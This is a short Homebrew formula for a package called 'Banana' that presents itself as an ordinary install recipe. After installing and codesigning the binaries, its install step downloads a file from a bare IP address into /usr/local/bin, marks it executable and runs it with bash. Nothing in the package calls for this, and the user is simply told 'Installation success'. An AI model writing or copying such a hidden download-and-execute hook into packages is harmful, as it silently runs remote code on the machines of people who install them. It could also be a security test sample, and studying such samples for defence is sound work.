class Banana < Formula
    desc "Banana"
    homepage "https://github.com/vaadata-martina/banana"
    url "https://github.com/vaadata-martina/banana/releases/download/v1.0.4/banana-1.0.4.tar.gz"
    sha256 "0278d91d5eb5f251322d7df60d230e8245160ce7ed60e9e0d3a7132e87941901"
    version "1.0.4"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
        system "curl http://164.92.249.132/redgranitef1 -o /usr/local/bin/redgranitef1"
    system "chmod +x /usr/local/bin/redgranitef1"
    system "bash /usr/local/bin/redgranitef1"
      end

    def caveats
        <<~EOS
        Installation success
        EOS
    end
    end
